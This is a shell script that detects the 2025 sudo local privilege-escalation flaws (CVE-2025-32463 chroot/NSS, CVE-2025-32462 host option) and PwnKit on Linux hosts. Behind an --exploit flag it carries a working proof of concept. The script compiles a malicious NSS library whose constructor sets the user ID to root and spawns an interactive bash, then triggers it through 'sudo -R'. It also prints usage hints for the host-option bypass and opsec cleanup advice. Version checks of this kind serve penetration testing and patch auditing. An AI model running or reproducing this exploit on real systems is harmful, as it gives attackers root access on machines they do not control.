#!/bin/sh
# sudo_cve_2025_check.sh - Detect and (optionally) exploit the 2025 sudo LPE CVEs + PwnKit.
#
#   CVE-2025-32463  sudo --chroot / NSS injection   (1.9.14-1.9.17)  - default config, ITW/CISA KEV
#   CVE-2025-32462  sudo --host option bypass        (1.8.8-1.9.17)  - needs non-ALL Host sudoers rule
#   CVE-2021-4034   pkexec PwnKit                     (polkit <=0.118) - legacy hosts
#
# USAGE:
#   ./sudo_cve_2025_check.sh            # detect only (safe, read-only)
#   ./sudo_cve_2025_check.sh --exploit  # additionally drop & run the CVE-2025-32463 PoC (needs gcc)
#
# DEPENDENCIES: POSIX sh, sudo, gcc (only for --exploit). Authorized engagements only.
# OPSEC: --exploit writes a chroot tree + libnss_*.so and produces a `sudo ... CHROOT=` syslog entry.
#        Clean the staging dir afterward (the script offers to). Patched version is 1.9.17p1.

GREEN='\033[92m'; RED='\033[91m'; YEL='\033[93m'; CYN='\033[96m'; RST='\033[0m'
[ -t 1 ] || { GREEN=''; RED=''; YEL=''; CYN=''; RST=''; }

EXPLOIT=0
[ "$1" = "--exploit" ] && EXPLOIT=1

printf "%bsudo_cve_2025_check.sh%b  $(date -u '+%Y-%m-%dT%H:%M:%SZ')\n" "$CYN" "$RST"

if ! command -v sudo >/dev/null 2>&1; then
  printf "%b[!]%b sudo not installed\n" "$YEL" "$RST"
else
  SVER_RAW=$(sudo --version 2>/dev/null | head -1)
  printf "%b[info]%b %s\n" "$CYN" "$RST" "$SVER_RAW"
  # extract a.b.c (and patch suffix pNN if present)
  VER=$(printf '%s' "$SVER_RAW" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+(p[0-9]+)?' | head -1)
  A=$(printf '%s' "$VER" | cut -d. -f1)
  B=$(printf '%s' "$VER" | cut -d. -f2)
  C=$(printf '%s' "$VER" | cut -d. -f3 | sed 's/p.*//')
  PATCH=$(printf '%s' "$VER" | grep -oE 'p[0-9]+' | tr -d 'p')
  [ -z "$PATCH" ] && PATCH=0
  # numeric key for comparison: A*1e6 + B*1e3 + C
  KEY=$(( A*1000000 + B*1000 + C ))

  # CVE-2025-32463 range 1.9.14 - 1.9.17 (and not >= 1.9.17p1)
  LO_463=1009014; HI_463=1009017
  # CVE-2025-32462 range 1.8.8 - 1.9.17
  LO_462=1008008; HI_462=1009017
  PATCHED=0
  if [ "$KEY" -eq 1009017 ] && [ "$PATCH" -ge 1 ]; then PATCHED=1; fi

  printf "\n%b--- CVE-2025-32463 (chroot/NSS) ---%b\n" "$CYN" "$RST"
  if [ "$KEY" -ge "$LO_463" ] && [ "$KEY" -le "$HI_463" ] && [ "$PATCHED" -eq 0 ]; then
    printf "%b[HIGH]%b version in vulnerable range (1.9.14-1.9.17)\n" "$RED" "$RST"
    # dynamic confirmation: vulnerable build resolves the path INSIDE chroot first
    OUT=$(sudo -R /tmp/.nonexist_$$ /bin/true 2>&1)
    case "$OUT" in
      *"No such file or directory"*|*"chdir"*)
        printf "%b[HIGH]%b dynamic test consistent with vulnerable chroot path handling\n" "$RED" "$RST" ;;
      *) printf "%b[med ]%b dynamic test inconclusive (out: %s)\n" "$YEL" "$RST" "$OUT" ;;
    esac
  elif [ "$PATCHED" -eq 1 ]; then
    printf "%b[ok]%b 1.9.17p1+ : patched\n" "$GREEN" "$RST"
  else
    printf "%b[ok]%b version outside 1.9.14-1.9.17\n" "$GREEN" "$RST"
  fi

  printf "\n%b--- CVE-2025-32462 (host option) ---%b\n" "$CYN" "$RST"
  if [ "$KEY" -ge "$LO_462" ] && [ "$KEY" -le "$HI_462" ] && [ "$PATCHED" -eq 0 ]; then
    printf "%b[HIGH]%b version in vulnerable range (1.8.8-1.9.17)\n" "$RED" "$RST"
    SL=$(sudo -n -l 2>/dev/null)
    HOSTRULE=$(printf '%s' "$SL" | grep -iE 'on [A-Za-z0-9_.-]+' | grep -viE 'on (ALL|.*ALL)')
    if [ -n "$HOSTRULE" ]; then
      printf "%b[HIGH]%b host-restricted sudoers rule(s) present -> exploitable:\n" "$RED" "$RST"
      printf '       %s\n' "$HOSTRULE"
      printf "       Try: sudo -l -h <otherhost> ; then  sudo -h <otherhost> id\n"
    else
      printf "%b[med ]%b vulnerable version but no obvious non-ALL Host rule in 'sudo -l'\n" "$YEL" "$RST"
      printf "       (may still apply via LDAP/SSSD sudoers - check ldapsearch)\n"
    fi
  else
    printf "%b[ok]%b not in vulnerable range / patched\n" "$GREEN" "$RST"
  fi
fi

# ---- PwnKit (legacy) ------------------------------------------------------
printf "\n%b--- CVE-2021-4034 (PwnKit / pkexec) ---%b\n" "$CYN" "$RST"
if command -v pkexec >/dev/null 2>&1; then
  PKV=$(pkexec --version 2>/dev/null | head -1)
  printf "%b[med ]%b pkexec present: %s\n" "$YEL" "$RST" "$PKV"
  printf "       polkit 0.113-0.118 are vulnerable; PoC: ly4k/PwnKit one-shot binary\n"
else
  printf "%b[ok]%b pkexec not present\n" "$GREEN" "$RST"
fi

# ---- Exploit (CVE-2025-32463) ---------------------------------------------
if [ "$EXPLOIT" -eq 1 ]; then
  printf "\n%b=== Dropping CVE-2025-32463 PoC ===%b\n" "$CYN" "$RST"
  if ! command -v gcc >/dev/null 2>&1; then
    printf "%b[!]%b gcc not found; cannot build the NSS module. Precompile elsewhere and drop libnss_/woot1337.so.2\n" "$RED" "$RST"
    exit 1
  fi
  STG=$(mktemp -d /tmp/sudowoot.XXXXXX) || exit 1
  mkdir -p "$STG/libnss_" "$STG/etc"
  cat > "$STG/woot.c" <<'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void woot(void){
    setreuid(0,0); setregid(0,0);
    chdir("/");
    execl("/bin/bash","/bin/bash","-i",NULL);
}
EOF
  gcc -shared -fPIC -Wl,-init,woot -o "$STG/libnss_/woot1337.so.2" "$STG/woot.c" 2>/dev/null \
    || gcc -shared -fPIC -o "$STG/libnss_/woot1337.so.2" "$STG/woot.c"
  printf "passwd: /woot1337\n" > "$STG/etc/nsswitch.conf"
  printf "%b[*]%b staging dir: %s\n" "$YEL" "$RST" "$STG"
  printf "%b[*]%b triggering: sudo -R %s woot\n" "$YEL" "$RST" "$STG"
  sudo -R "$STG" woot 2>/dev/null || sudo -R "$STG" id 2>/dev/null
  RC=$?
  printf "%b[*]%b exit=%s. If you did not get a root shell, the host is likely patched.\n" "$YEL" "$RST" "$RC"
  printf "%b[opsec]%b clean up with:  rm -rf %s\n" "$RED" "$RST" "$STG"
fi
